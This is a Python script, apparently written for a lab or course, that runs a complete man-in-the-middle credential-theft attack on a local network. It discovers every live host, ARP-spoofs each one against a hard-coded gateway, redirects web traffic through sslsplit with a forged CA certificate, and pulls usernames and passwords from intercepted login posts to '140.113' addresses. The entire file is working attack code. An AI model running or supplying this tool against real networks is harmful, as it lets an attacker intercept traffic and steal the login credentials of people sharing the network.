#!./.env/bin/python
import scapy.all as scapy
import threading
import time
import netifaces
import ipaddress
import os
import shutil


GATEWAY_IP = '10.6.0.254'
LOG_DIR = 'log'
IPS = list()

lock = threading.Lock()


def get_mac(ip: str):
    try:
        ans = scapy.srp(scapy.Ether(dst="ff:ff:ff:ff:ff:ff") /
                        scapy.ARP(pdst=ip), timeout=2, verbose=False)[0]
    except Exception:
        return None
    else:
        if len(ans) == 0:
            return None
        return ans[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    packet = scapy.ARP(op=2, pdst=target_ip,
                       hwdst=get_mac(target_ip),
                       psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def trick(victim_ips: str):
    os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
    while True:
        for victim_ip in victim_ips:
            # print('attack', victim_ip)
            spoof(victim_ip, GATEWAY_IP)
            spoof(GATEWAY_IP, victim_ip)
        time.sleep(10)


def alive(ip: str) -> bool:
    mac = get_mac(ip)
    if mac is None:
        return False
    print(f'{ip}\t{get_mac(ip)}')
    lock.acquire()
    IPS.append(ip)
    lock.release()
    return True


def get_victims() -> list:
    threads = list()
    for ifname in netifaces.interfaces():
        if ifname != 'lo':
            addr = netifaces.ifaddresses(ifname)[netifaces.AF_INET][0]['addr']
            mask = netifaces.ifaddresses(
                ifname)[netifaces.AF_INET][0]['netmask']
            iface = ipaddress.IPv4Interface(f'{addr}/{mask}')
            network = ipaddress.ip_network(iface.network)
            for ip in network:
                threads.append(threading.Thread(
                    target=alive, args=[str(ip)]))
    print(f'Available Devices')
    print(f'--------------------------------------------------')
    print('IP\t\tMAC')
    print(f'--------------------------------------------------')
    for t in threads:
        t.start()
    for t in threads:
        t.join()
    print(f'--------------------------------------------------')
    return IPS


def sslsplit():
    os.system('iptables -t nat -F')
    os.system(
        'iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080')
    os.system(
        'iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 8443')
    shutil.rmtree(LOG_DIR, ignore_errors=True)
    os.makedirs(LOG_DIR)
    os.system(
        f'sslsplit ssl 0.0.0.0 8443 tcp 0.0.0.0 8080 -k ca.key -c ca.crt -l connection.log -S {LOG_DIR} > /dev/null 2>/dev/null')


def mitm():
    time.sleep(8)
    while True:
        time.sleep(1)
        for filename in os.scandir(LOG_DIR):
            if filename.is_file():
                if '140.113' in filename.path:
                    with open(filename.path, mode='r', encoding='utf-8', errors='ignore') as f:
                        for line in f:
                            if line[:10] == 'logintoken':
                                line = line.split('&')
                                username = line[1].split('=')[1]
                                password = line[2].split('=')[1]
                                print(f'Username: {username}')
                                print(f'Password: {password}')
                    open(filename.path, mode='w').close()


def main():
    ips = get_victims()
    threads = list()
    threads.append(threading.Thread(target=trick, args=[ips]))
    threads.append(threading.Thread(target=sslsplit))
    threads.append(threading.Thread(target=mitm))
    for t in threads:
        t.start()


if __name__ == '__main__':
    main()
